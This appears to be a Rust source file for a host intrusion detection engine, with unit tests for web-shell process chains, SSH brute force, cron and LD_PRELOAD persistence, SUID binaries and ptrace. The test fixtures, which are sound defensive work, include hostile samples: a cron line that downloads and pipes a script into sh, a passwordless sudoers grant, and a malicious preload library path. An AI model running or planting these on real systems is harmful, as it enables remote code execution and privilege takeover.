//! The detection engine: owns all state, consumes [`Event`]s, emits [`Alert`]s.
//! Pure Rust, no I/O - everything here is unit-testable on any platform.

use chrono::{DateTime, Duration, Utc};
use std::collections::{BTreeMap, HashMap, VecDeque};

use crate::alert::{Alert, Finding, RefGen};
use crate::allowlist::Allowlist;
use crate::baseline::Baseline;
use crate::config::Config;
use crate::dedup::{Decision, Deduper};
pub use crate::detect::FlaggedChain as EngineFlaggedChain;
use crate::detect::{self, BurstTracker, Ctx, FileSnapshots, FlaggedChain};
use crate::events::{AuthResult, DetectionId, Event, Severity};
use crate::proctree::ProcessTree;

/// How long a D1 flag keeps escalating related activity.
const FLAG_TTL_SECS: i64 = 600;
/// Processes not seen for this long are dropped from the tree.
const TREE_RETENTION_HOURS: i64 = 48;
/// Idle auth sources are forgotten after this long.
const BURST_RETENTION_SECS: i64 = 3600;
/// Event timestamps further ahead of the wall clock than this are clamped.
pub const MAX_FUTURE_SKEW_SECS: i64 = 60;
/// Upper bound on remembered D1 flags; the oldest are dropped first.
const MAX_FLAGS: usize = 4096;

#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
pub struct Counters {
    pub events_processed: u64,
    pub by_severity: BTreeMap<String, u64>,
    pub alerts_today: u64,
    pub day: String,
}

impl Counters {
    pub fn record_event(&mut self) {
        self.events_processed += 1;
    }

    pub fn record_alert(&mut self, severity: Severity) {
        *self
            .by_severity
            .entry(severity.as_str().to_string())
            .or_insert(0) += 1;
        self.alerts_today += 1;
    }

    fn roll_day(&mut self, day: &str) {
        if day != self.day {
            self.day = day.to_string();
            self.alerts_today = 0;
            self.by_severity.clear();
        }
    }
}

pub struct Engine {
    pub tree: ProcessTree,
    pub baseline: Baseline,
    pub cfg: Config,
    pub allowlist: Allowlist,
    pub host: String,
    pub user_names: HashMap<u32, String>,
    pub dedup: Deduper,
    pub refs: RefGen,
    pub flags: VecDeque<FlaggedChain>,
    pub bursts: BurstTracker,
    pub files: FileSnapshots,
    pub listeners: HashMap<(String, u16), DateTime<Utc>>,
    pub counters: Counters,
}

fn day_key(now: DateTime<Utc>) -> String {
    now.format("%Y-%m%d").to_string()
}

impl Engine {
    pub fn new(cfg: Config, allowlist: Allowlist, mut baseline: Baseline, host: String) -> Self {
        let now = Utc::now();
        baseline.migrate_connectors(now);
        let dedup_window = cfg.notifications.dedup_window_secs;
        let counters = Counters {
            day: day_key(now),
            ..Counters::default()
        };
        Engine {
            tree: ProcessTree::new(),
            baseline,
            cfg,
            allowlist,
            host,
            user_names: HashMap::new(),
            dedup: Deduper::new(dedup_window),
            refs: RefGen::new(now),
            flags: VecDeque::new(),
            bursts: BurstTracker::default(),
            files: FileSnapshots::default(),
            listeners: HashMap::new(),
            counters,
        }
    }

    /// Restore per-day state persisted by the daemon across restarts.
    pub fn restore(
        &mut self,
        now: DateTime<Utc>,
        ref_day: &str,
        ref_seq: u32,
        counters: Option<Counters>,
    ) {
        self.refs = RefGen::resume(now, ref_day, ref_seq);
        if let Some(c) = counters {
            if c.day == day_key(now) {
                self.counters = c;
            }
        }
    }

    pub fn set_user_names(&mut self, names: HashMap<u32, String>) {
        self.user_names = names;
    }

    pub fn seed_file_snapshot(&mut self, path: &str, content: String) {
        self.files.update(path, content);
    }

    pub fn set_config(&mut self, cfg: Config, allowlist: Allowlist) {
        if cfg.notifications.dedup_window_secs != self.cfg.notifications.dedup_window_secs {
            self.dedup = Deduper::new(cfg.notifications.dedup_window_secs);
        }
        self.cfg = cfg;
        self.allowlist = allowlist;
    }

    fn ctx(&self, now: DateTime<Utc>) -> Ctx<'_> {
        Ctx {
            tree: &self.tree,
            baseline: &self.baseline,
            allowlist: &self.allowlist,
            cfg: &self.cfg,
            flags: &self.flags,
            user_names: &self.user_names,
            now,
        }
    }

    pub fn process(&mut self, ev: Event) -> Vec<Alert> {
        self.process_at(ev, Utc::now())
    }

    /// Like [`process`](Self::process) with an explicit wall clock.
    ///
    /// Event timestamps come from logs and collectors and can be wrong (a
    /// syslog line with the wrong year, a clock step). A timestamp in the
    /// future used to set dedup/flag/baseline state ahead of real time, which
    /// suppressed that signature until the clock caught up and stopped flag
    /// pruning. Timestamps more than [`MAX_FUTURE_SKEW_SECS`] ahead of
    /// `wall` are clamped to `wall`.
    pub fn process_at(&mut self, mut ev: Event, wall: DateTime<Utc>) -> Vec<Alert> {
        let limit = wall + Duration::seconds(MAX_FUTURE_SKEW_SECS);
        if ev.ts() > limit {
            ev.set_ts(wall);
        }
        self.counters.record_event();
        let now = ev.ts();
        self.counters.roll_day(&day_key(now));
        self.prune_flags(now);
        self.baseline.check_completion(now);

        let mut findings: Vec<Finding> = Vec::new();

        match ev {
            Event::Exec(e) => {
                self.tree.upsert_exec(&e);
                if self.cfg.detections.d1_process_chains {
                    let d1 = detect::d1::evaluate(&e, &self.ctx(now));
                    self.flag_from_findings(&d1, now);
                    findings.extend(d1);
                }
                if self.cfg.detections.d4_priv_esc {
                    findings.extend(detect::d4::evaluate_exec(&e, &self.ctx(now)));
                }
            }
            Event::Connect(e) => {
                self.tree.touch(e.pid, now);
                if self.cfg.detections.d5_network {
                    findings.extend(detect::d5::evaluate_connect(&e, &self.ctx(now)));
                }
                self.baseline.observe_dest(e.daddr, now);
                let exe = detect::d5::connector_exe(&self.tree, e.pid, &e.comm);
                self.baseline
                    .observe_connector(&detect::d5::connector_key(&exe, e.uid), now);
            }
            Event::Ptrace(e) => {
                if self.cfg.detections.d4_priv_esc {
                    findings.extend(detect::d4::evaluate_ptrace(&e, &self.ctx(now)));
                }
            }
            Event::File(mut e) => {
                // If the daemon could not determine session presence, derive it.
                if e.writer.is_none() && !e.session_present {
                    e.session_present = self.tree.any_interactive_session();
                }
                if let Some(w) = &e.writer {
                    self.tree.touch(w.pid, now);
                }
                let is_account_file = e.path == "/etc/passwd" || e.path == "/etc/group";
                if self.cfg.detections.d2_auth {
                    let ctx = self.ctx(now);
                    findings.extend(detect::d2::evaluate_ssh_config_file(&e, &ctx));
                    if is_account_file {
                        let old = self.files.get(&e.path).cloned();
                        findings.extend(detect::d2::check_account_changes(&e, &ctx, old.as_ref()));
                    }
                }
                if self.cfg.detections.d3_persistence {
                    findings.extend(detect::d3::evaluate(&e, &self.ctx(now)));
                }
                if self.cfg.detections.d4_priv_esc {
                    findings.extend(detect::d4::evaluate_file(&e, &self.ctx(now)));
                }
                if is_account_file {
                    if let Some(content) = &e.content {
                        self.files.update(&e.path, content.clone());
                        if e.path == "/etc/passwd" {
                            self.user_names = parse_user_names(content);
                        }
                    }
                }
            }
            Event::Auth(e) => {
                if self.cfg.detections.d2_auth {
                    let ctx = Ctx {
                        tree: &self.tree,
                        baseline: &self.baseline,
                        allowlist: &self.allowlist,
                        cfg: &self.cfg,
                        flags: &self.flags,
                        user_names: &self.user_names,
                        now,
                    };
                    findings.extend(detect::d2::evaluate_auth(&e, &ctx, &mut self.bursts));
                }
                if e.result == AuthResult::Success {
                    if let Some(ip) = e.rhost {
                        self.baseline.observe_ssh_source(ip, now);
                        if e.user == "root" {
                            self.baseline.observe_root_source(ip);
                        }
                    }
                }
            }
            Event::Listener(e) => {
                let key = (e.proto.clone(), e.port);
                if self.listeners.contains_key(&key) {
                    self.listeners.insert(key, now);
                } else {
                    if self.cfg.detections.d5_network {
                        findings.extend(detect::d5::evaluate_listener(&e, &self.ctx(now)));
                    }
                    self.listeners.insert(key, now);
                }
            }
        }

        self.raise(findings, now)
    }

    /// Periodic housekeeping; returns dedup summaries to deliver.
    pub fn tick(&mut self, now: DateTime<Utc>) -> Vec<Alert> {
        self.counters.roll_day(&day_key(now));
        self.baseline.check_completion(now);
        self.tree.prune(now - Duration::hours(TREE_RETENTION_HOURS));
        self.bursts
            .prune(now - Duration::seconds(BURST_RETENTION_SECS));
        self.prune_flags(now);
        let listener_cutoff = now - Duration::hours(TREE_RETENTION_HOURS);
        self.listeners.retain(|_, t| *t >= listener_cutoff);

        let mut alerts = Vec::new();
        for summary in self.dedup.tick(now) {
            let alert = Alert::from_finding(summary, self.refs.next(now), self.host.clone(), now);
            self.counters.record_alert(alert.severity);
            alerts.push(alert);
        }
        alerts
    }

    /// Forget a listener so it will alert again if it reappears (called when
    /// the daemon observes the port closing).
    pub fn forget_listener(&mut self, proto: &str, port: u16) {
        self.listeners.remove(&(proto.to_string(), port));
    }

    /// Build an alert for an engine-external finding (self-protection, lifecycle).
    /// Goes through the same dedup window as detection findings.
    pub fn alert_from(&mut self, finding: Finding, now: DateTime<Utc>) -> Option<Alert> {
        if let Decision::Emit = self.dedup.record(&finding.signature, now, &finding) {
            let alert = Alert::from_finding(finding, self.refs.next(now), self.host.clone(), now);
            self.counters.record_alert(alert.severity);
            Some(alert)
        } else {
            None
        }
    }

    fn flag_from_findings(&mut self, findings: &[Finding], now: DateTime<Utc>) {
        for f in findings {
            if f.detection != DetectionId::D1 || f.severity < Severity::High {
                continue;
            }
            // Never flag init or long-lived service roots (sshd, cron, systemd):
            // that would taint every process on the host. Keep only the
            // suspicious tail of the chain.
            let pids: Vec<u32> = f
                .pids
                .iter()
                .copied()
                .filter(|pid| {
                    *pid > 1
                        && self
                            .tree
                            .get(*pid)
                            .map(|p| {
                                !matches!(
                                    crate::proctree::role_of(&p.comm, &p.exe),
                                    crate::proctree::Role::System
                                        | crate::proctree::Role::Sshd
                                        | crate::proctree::Role::Cron
                                ) && p.ppid != 0
                            })
                            .unwrap_or(true)
                })
                .collect();
            if pids.is_empty() {
                continue;
            }
            self.flags.push_back(FlaggedChain {
                pids,
                detection: DetectionId::D1,
                severity: f.severity,
                ts: now,
                reason: f.title.clone(),
            });
        }
    }

    fn prune_flags(&mut self, now: DateTime<Utc>) {
        // Not just the front: flags aren't guaranteed to be in time order
        // (event timestamps can arrive out of order), and one young flag at
        // the front used to shield every expired flag behind it.
        let ttl = Duration::seconds(FLAG_TTL_SECS);
        self.flags.retain(|f| now - f.ts <= ttl);
        while self.flags.len() > MAX_FLAGS {
            self.flags.pop_front();
        }
    }

    fn raise(&mut self, findings: Vec<Finding>, now: DateTime<Utc>) -> Vec<Alert> {
        let mut alerts = Vec::new();
        for finding in findings {
            if let Decision::Emit = self.dedup.record(&finding.signature, now, &finding) {
                let alert =
                    Alert::from_finding(finding, self.refs.next(now), self.host.clone(), now);
                self.counters.record_alert(alert.severity);
                alerts.push(alert);
            }
        }
        alerts
    }
}

pub fn parse_user_names(passwd_content: &str) -> HashMap<u32, String> {
    let mut map = HashMap::new();
    for line in passwd_content.lines() {
        if line.starts_with('#') {
            continue;
        }
        let mut it = line.split(':');
        if let (Some(name), Some(_), Some(uid)) = (it.next(), it.next(), it.next()) {
            if let Ok(uid) = uid.parse::<u32>() {
                map.insert(uid, name.to_string());
            }
        }
    }
    map
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::events::*;
    use chrono::Timelike;
    use std::net::IpAddr;

    fn engine_without_baseline() -> Engine {
        let cfg = Config::default();
        let allowlist = Allowlist::default();
        let baseline = Baseline::new(false, 24, Utc::now());
        let mut eng = Engine::new(cfg, allowlist, baseline, "test-host".into());
        let mut users = HashMap::new();
        users.insert(33, "www-data".to_string());
        users.insert(0, "root".to_string());
        users.insert(1000, "dev".to_string());
        eng.set_user_names(users);
        eng
    }

    fn exec(ts: DateTime<Utc>, pid: u32, ppid: u32, uid: u32, comm: &str, exe: &str) -> Event {
        Event::Exec(ExecEvent {
            ts,
            pid,
            ppid,
            uid,
            gid: uid,
            comm: comm.into(),
            exe: exe.into(),
            argv0: exe.into(),
            ld_preload: false,
            deleted_exe: false,
            tty_nr: 0,
            container: false,
            container_id: None,
        })
    }

    fn file(
        ts: DateTime<Utc>,
        path: &str,
        kind: FileKind,
        writer: Option<WriterInfo>,
        content: Option<&str>,
    ) -> FileEvent {
        FileEvent {
            ts,
            path: path.into(),
            kind,
            dev: 0,
            ino: 0,
            writer,
            session_present: false,
            is_suid: false,
            has_file_caps: false,
            content: content.map(str::to_string),
            container: false,
            managed_by_package: None,
        }
    }

    fn writer(pid: u32, uid: u32, comm: &str, tty_nr: i64) -> WriterInfo {
        WriterInfo {
            pid,
            uid,
            comm: comm.into(),
            exe: format!("/usr/bin/{}", comm),
            tty_nr,
        }
    }

    /// Process an event as if the wall clock were at the event's own time,
    /// for tests that step time forward.
    fn at(eng: &mut Engine, ev: Event) -> Vec<Alert> {
        let ts = ev.ts();
        eng.process_at(ev, ts)
    }

    fn has(alerts: &[Alert], d: DetectionId, s: Severity) -> bool {
        alerts.iter().any(|a| a.detection == d && a.severity == s)
    }

    fn max_sev(alerts: &[Alert]) -> Option<Severity> {
        alerts.iter().map(|a| a.severity).max()
    }

    // ---- D1 -------------------------------------------------------------

    #[test]
    fn webshell_chain_fires_critical_and_carries_chain() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        eng.process(exec(t, 300, 200, 33, "curl", "/usr/bin/curl"));
        let alerts = eng.process(exec(t, 400, 300, 33, "sh", "/tmp/payload.sh"));
        let crit = alerts
            .iter()
            .find(|a| a.detection == DetectionId::D1 && a.severity == Severity::Critical)
            .unwrap_or_else(|| panic!("expected CRITICAL D1, got {:?}", alerts));
        assert_eq!(crit.chain.len(), 5);
        assert!(crit.chain.last().unwrap().focus);
        assert_eq!(crit.chain[1].user.as_deref(), Some("www-data"));
    }

    #[test]
    fn web_shell_alone_fires_high() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        let alerts = eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        assert!(
            has(&alerts, DetectionId::D1, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn ssh_session_bash_is_ignored() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
        let alerts = eng.process(exec(t, 60, 50, 0, "bash", "/usr/bin/bash"));
        assert!(
            max_sev(&alerts).map(|s| s < Severity::High).unwrap_or(true),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn allowlisted_chain_suppressed() {
        let mut cfg = Config::default();
        cfg.allowlist
            .process_chains
            .push(crate::allowlist::ProcessChainRule {
                parent: "nginx".into(),
                child: "bash".into(),
                user: None,
                reason: "test".into(),
            });
        let mut eng = Engine::new(
            cfg.clone(),
            cfg.allowlist.clone(),
            Baseline::new(false, 24, Utc::now()),
            "h".into(),
        );
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        let alerts = eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        assert!(alerts.is_empty(), "{:?}", alerts);
    }

    #[test]
    fn transient_exec_severity_depends_on_context() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        // Unattended: cron -> /tmp binary.
        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
        let a = eng.process(exec(t, 401, 400, 0, "x", "/tmp/x"));
        assert!(has(&a, DetectionId::D1, Severity::High), "{:?}", a);
        // Interactive: sshd -> bash -> /tmp binary.
        eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
        eng.process(exec(t, 60, 50, 1000, "bash", "/usr/bin/bash"));
        let b = eng.process(exec(t, 61, 60, 1000, "installer", "/tmp/installer"));
        assert!(has(&b, DetectionId::D1, Severity::Low), "{:?}", b);
        assert!(!has(&b, DetectionId::D1, Severity::High));
        // Package manager child.
        eng.process(exec(t, 70, 1, 0, "apt-get", "/usr/bin/apt-get"));
        let c = eng.process(exec(t, 71, 70, 0, "postinst", "/tmp/pkg.postinst"));
        assert!(has(&c, DetectionId::D1, Severity::Low), "{:?}", c);
    }

    #[test]
    fn webshell_via_same_pid_exec_is_still_detected() {
        // bash -c 'curl ...; exec /tmp/.x.sh' - the payload replaces the shell's
        // image and keeps its PID. Real attackers do this constantly.
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        let a = eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        assert!(has(&a, DetectionId::D1, Severity::High));
        eng.process(exec(t, 300, 200, 33, "curl", "/usr/bin/curl"));
        // Same PID 200 now becomes the payload.
        let b = eng.process(exec(t, 200, 100, 33, ".x.sh", "/tmp/.x.sh"));
        let crit = b
            .iter()
            .find(|x| x.detection == DetectionId::D1 && x.severity == Severity::Critical)
            .unwrap_or_else(|| panic!("{:?}", b));
        let comms: Vec<&str> = crit.chain.iter().map(|n| n.comm.as_str()).collect();
        assert_eq!(comms, vec!["systemd", "nginx", "bash", ".x.sh"]);
    }

    #[test]
    fn transient_exec_inside_flagged_chain_is_critical() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash")); // flags chain
        let alerts = eng.process(exec(t, 201, 200, 33, "p", "/dev/shm/p"));
        assert!(
            has(&alerts, DetectionId::D1, Severity::Critical),
            "{:?}",
            alerts
        );
    }

    // ---- D2 -------------------------------------------------------------

    #[test]
    fn ssh_failed_burst_is_info_not_high() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        let ip: IpAddr = "198.51.100.77".parse().unwrap();
        let mut infos = 0;
        let mut highs = 0;
        for i in 0..8 {
            let alerts = eng.process(Event::Auth(AuthEvent {
                ts: t + Duration::seconds(i),
                result: AuthResult::Failure,
                user: "root".into(),
                rhost: Some(ip),
                service: "sshd".into(),
                tty: "ssh".into(),
            }));
            infos += alerts
                .iter()
                .filter(|a| a.detection == DetectionId::D2 && a.severity == Severity::Info)
                .count();
            highs += alerts
                .iter()
                .filter(|a| a.detection == DetectionId::D2 && a.severity == Severity::High)
                .count();
        }
        assert_eq!(infos, 1);
        assert_eq!(highs, 0);
    }

    #[test]
    fn ssh_success_after_burst_is_high() {
        let mut eng = engine_without_baseline();
        eng.cfg.ssh.off_hours_start = 0;
        eng.cfg.ssh.off_hours_end = 0;
        let t = Utc::now();
        let ip: IpAddr = "198.51.100.77".parse().unwrap();
        for i in 0..5 {
            let a = eng.process(Event::Auth(AuthEvent {
                ts: t + Duration::seconds(i),
                result: AuthResult::Failure,
                user: "cw".into(),
                rhost: Some(ip),
                service: "sshd".into(),
                tty: "ssh".into(),
            }));
            assert!(!has(&a, DetectionId::D2, Severity::High), "{:?}", a);
        }
        let alerts = eng.process(Event::Auth(AuthEvent {
            ts: t + Duration::seconds(6),
            result: AuthResult::Success,
            user: "deploy".into(),
            rhost: Some(ip),
            service: "sshd".into(),
            tty: "ssh".into(),
        }));
        assert!(
            has(&alerts, DetectionId::D2, Severity::High),
            "{:?}",
            alerts
        );
        assert!(
            alerts
                .iter()
                .any(|a| a.title.contains("after a failed-auth burst")),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn ssh_success_without_burst_is_not_burst_high() {
        let mut eng = engine_without_baseline();
        eng.cfg.ssh.off_hours_start = 0;
        eng.cfg.ssh.off_hours_end = 0;
        let alerts = eng.process(Event::Auth(AuthEvent {
            ts: Utc::now(),
            result: AuthResult::Success,
            user: "deploy".into(),
            rhost: Some("198.51.100.9".parse().unwrap()),
            service: "sshd".into(),
            tty: "ssh".into(),
        }));
        assert!(
            !alerts.iter().any(|a| a.title.contains("burst")),
            "{:?}",
            alerts
        );
        assert!(
            !has(&alerts, DetectionId::D2, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn root_ssh_login_fires_high_unless_permitted() {
        let login = |eng: &mut Engine| {
            eng.process(Event::Auth(AuthEvent {
                ts: Utc::now(),
                result: AuthResult::Success,
                user: "root".into(),
                rhost: Some("198.51.100.5".parse().unwrap()),
                service: "sshd".into(),
                tty: "ssh".into(),
            }))
        };
        let mut eng = engine_without_baseline();
        // Deterministic: disable off-hours so wall-clock does not affect severity.
        eng.cfg.ssh.off_hours_start = 0;
        eng.cfg.ssh.off_hours_end = 0;
        assert!(has(&login(&mut eng), DetectionId::D2, Severity::High));
        // Same source again: context only (dedup would suppress anyway, so
        // advance past the window to observe the severity directly).
        let again = eng.process(Event::Auth(AuthEvent {
            ts: Utc::now() + Duration::seconds(600),
            result: AuthResult::Success,
            user: "root".into(),
            rhost: Some("198.51.100.5".parse().unwrap()),
            service: "sshd".into(),
            tty: "ssh".into(),
        }));
        assert!(!has(&again, DetectionId::D2, Severity::High), "{:?}", again);
        let mut cfg = Config::default();
        cfg.ssh.permit_root = true;
        let mut eng = Engine::new(
            cfg,
            Allowlist::default(),
            Baseline::new(false, 24, Utc::now()),
            "h".into(),
        );
        assert!(login(&mut eng).is_empty());
    }

    #[test]
    fn novel_source_with_baseline_fires() {
        let mut cfg = Config::default();
        cfg.ssh.off_hours_start = 22;
        cfg.ssh.off_hours_end = 6;
        let mut baseline = Baseline::new(true, 24, Utc::now());
        baseline.complete = true;
        let mut eng = Engine::new(cfg, Allowlist::default(), baseline, "h".into());
        let alerts = at(
            &mut eng,
            Event::Auth(AuthEvent {
                ts: Utc::now().with_hour(12).unwrap(),
                result: AuthResult::Success,
                user: "deploy".into(),
                rhost: Some("203.0.113.9".parse().unwrap()),
                service: "sshd".into(),
                tty: "ssh".into(),
            }),
        );
        assert!(has(&alerts, DetectionId::D2, Severity::Low), "{:?}", alerts);
    }

    #[test]
    fn sudo_group_add_is_high() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.seed_file_snapshot("/etc/group", "sudo:x:27:alice\n".into());
        let alerts = eng.process(Event::File(file(
            t,
            "/etc/group",
            FileKind::Modified,
            None,
            Some("sudo:x:27:alice,mallory\n"),
        )));
        assert!(
            has(&alerts, DetectionId::D2, Severity::High),
            "{:?}",
            alerts
        );
    }

    // ---- D3 -------------------------------------------------------------

    #[test]
    fn cron_persistence_without_session_fires_high() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
        let alerts = eng.process(Event::File(file(
            t,
            "/etc/cron.d/evil",
            FileKind::Created,
            Some(writer(400, 0, "cron", 0)),
            Some("* * * * * root /opt/evil.sh\n"),
        )));
        assert!(
            has(&alerts, DetectionId::D3, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn cron_download_and_exec_is_critical() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        let alerts = eng.process(Event::File(file(
            t,
            "/etc/cron.d/evil",
            FileKind::Created,
            None,
            Some("* * * * * root curl -s http://198.51.100.1/x | sh\n"),
        )));
        assert!(
            has(&alerts, DetectionId::D3, Severity::Critical),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn cron_edit_with_session_is_info_only() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
        eng.process(exec(t, 60, 50, 1000, "bash", "/usr/bin/bash"));
        let alerts = eng.process(Event::File(file(
            t,
            "/etc/cron.d/job",
            FileKind::Created,
            Some(writer(60, 1000, "bash", 1)),
            None,
        )));
        assert!(
            max_sev(&alerts).map(|s| s < Severity::High).unwrap_or(true),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn editor_rename_with_session_present_is_info() {
        // vim writes via temp+rename: no writer, but an ssh session is active.
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
        eng.process(exec(t, 60, 50, 1000, "bash", "/usr/bin/bash"));
        let swap = eng.process(Event::File(file(
            t,
            "/etc/cron.d/.job.swp",
            FileKind::Created,
            None,
            None,
        )));
        assert!(swap.is_empty(), "{:?}", swap);
        let alerts = eng.process(Event::File(file(
            t,
            "/etc/cron.d/job",
            FileKind::MovedTo,
            None,
            Some("0 3 * * * root /usr/bin/backup\n"),
        )));
        assert!(
            max_sev(&alerts).map(|s| s < Severity::High).unwrap_or(true),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn editor_rename_with_no_session_is_high() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
        let alerts = eng.process(Event::File(file(
            t,
            "/root/.bashrc",
            FileKind::MovedTo,
            None,
            None,
        )));
        assert!(
            has(&alerts, DetectionId::D3, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn ld_preload_modification_fires_critical_with_libs() {
        let mut eng = engine_without_baseline();
        let alerts = eng.process(Event::File(file(
            Utc::now(),
            "/etc/ld.so.preload",
            FileKind::Modified,
            None,
            Some("/tmp/libevil.so\n"),
        )));
        let a = alerts
            .iter()
            .find(|a| a.detection == DetectionId::D3 && a.severity == Severity::Critical)
            .unwrap_or_else(|| panic!("{:?}", alerts));
        assert!(a.facts.iter().any(|f| f.value.contains("/tmp/libevil.so")));
    }

    #[test]
    fn package_installed_systemd_unit_is_silent() {
        let mut eng = engine_without_baseline();
        let mut ev = file(
            Utc::now(),
            "/etc/systemd/system/foo.service",
            FileKind::Created,
            None,
            None,
        );
        ev.managed_by_package = Some(true);
        assert!(eng.process(Event::File(ev)).is_empty());
    }

    #[test]
    fn binaries_named_like_trusted_tools_get_no_exemption() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
        let fake = |pid, comm: &str| WriterInfo {
            pid,
            uid: 0,
            comm: comm.into(),
            exe: format!("/tmp/{}", comm),
            tty_nr: 0,
        };
        eng.process(exec(t, 500, 400, 0, "dpkg", "/tmp/dpkg"));
        let cron = eng.process(Event::File(file(
            t,
            "/etc/cron.d/evil",
            FileKind::Created,
            Some(fake(500, "dpkg")),
            Some("* * * * * root /opt/evil.sh\n"),
        )));
        assert!(has(&cron, DetectionId::D3, Severity::High), "{:?}", cron);

        eng.process(exec(t, 501, 400, 0, "crontab", "/tmp/crontab"));
        let spool = eng.process(Event::File(file(
            t,
            "/var/spool/cron/crontabs/root",
            FileKind::Modified,
            Some(fake(501, "crontab")),
            Some("* * * * * /opt/evil.sh\n"),
        )));
        assert!(has(&spool, DetectionId::D3, Severity::High), "{:?}", spool);

        eng.process(exec(t, 502, 400, 0, "visudo", "/tmp/visudo"));
        let sudo = eng.process(Event::File(file(
            t,
            "/etc/sudoers.d/99-x",
            FileKind::Created,
            Some(fake(502, "visudo")),
            Some("mallory ALL=(ALL) NOPASSWD: ALL\n"),
        )));
        assert!(
            has(&sudo, DetectionId::D4, Severity::Critical),
            "{:?}",
            sudo
        );
    }

    // ---- D4 -------------------------------------------------------------

    #[test]
    fn suid_in_tmp_fires_critical() {
        let mut eng = engine_without_baseline();
        let mut ev = file(
            Utc::now(),
            "/tmp/evil-su",
            FileKind::Created,
            Some(writer(10, 1000, "gcc", 0)),
            None,
        );
        ev.is_suid = true;
        let alerts = eng.process(Event::File(ev));
        assert!(
            has(&alerts, DetectionId::D4, Severity::Critical),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn ld_preload_exec_unattended_high_interactive_info() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        let mk = |pid, ppid, tty| {
            Event::Exec(ExecEvent {
                ts: t,
                pid,
                ppid,
                uid: 0,
                gid: 0,
                comm: "bash".into(),
                exe: "/usr/bin/bash".into(),
                argv0: "bash".into(),
                ld_preload: true,
                deleted_exe: false,
                tty_nr: tty,
                container: false,
                container_id: None,
            })
        };
        let a = eng.process(mk(900, 1, 0));
        assert!(has(&a, DetectionId::D4, Severity::High), "{:?}", a);
        let b = eng.process(mk(901, 1, 5));
        assert!(has(&b, DetectionId::D4, Severity::Info), "{:?}", b);
        assert!(!has(&b, DetectionId::D4, Severity::High));
    }

    #[test]
    fn ptrace_attach_from_unknown_fires_high_debugger_ignored() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        let mk = |pid, comm: &str, request| {
            Event::Ptrace(PtraceEvent {
                ts: t,
                pid,
                uid: 1000,
                comm: comm.into(),
                target_pid: 1,
                request,
            })
        };
        assert!(has(
            &eng.process(mk(500, "mimikatz-like", 16)),
            DetectionId::D4,
            Severity::High
        ));
        assert!(eng.process(mk(501, "gdb", 16)).is_empty());
        // Non-attach requests are ignored.
        assert!(eng.process(mk(502, "weird", 3)).is_empty());
        // A binary merely named gdb is still an unexpected attacher.
        eng.process(exec(t, 503, 1, 1000, "gdb", "/dev/shm/gdb"));
        assert!(has(
            &eng.process(mk(503, "gdb", 16)),
            DetectionId::D4,
            Severity::High
        ));
    }

    #[test]
    fn useradd_rename_of_shadow_is_silent() {
        // useradd writes /etc/shadow via temp+rename and has exited by the time
